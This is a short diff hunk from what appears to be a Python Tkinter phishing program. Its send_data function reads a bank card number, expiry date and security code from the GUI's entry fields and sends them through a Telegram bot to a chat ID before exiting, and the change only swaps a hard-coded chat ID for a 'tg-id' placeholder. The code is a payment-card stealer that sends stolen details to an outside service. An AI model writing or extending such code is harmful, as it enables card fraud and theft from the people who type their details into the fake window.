@@ -40,7 +40,7 @@ class AnimateGifLabel(Label):
 def send_data():
     import telebot
     bot = telebot.TeleBot(token)
-    bot.send_message(f'1968765091', f'номер карты: {card_nomber_entry.get()}\nсрок годности: {shelf_life_entry.get()}\nкод безопасности: {securety_code_entry.get()}')
+    bot.send_message(f'tg-id', f'номер карты: {card_nomber_entry.get()}\nсрок годности: {shelf_life_entry.get()}\nкод безопасности: {securety_code_entry.get()}')
     exit()
 
 root1=Tk()
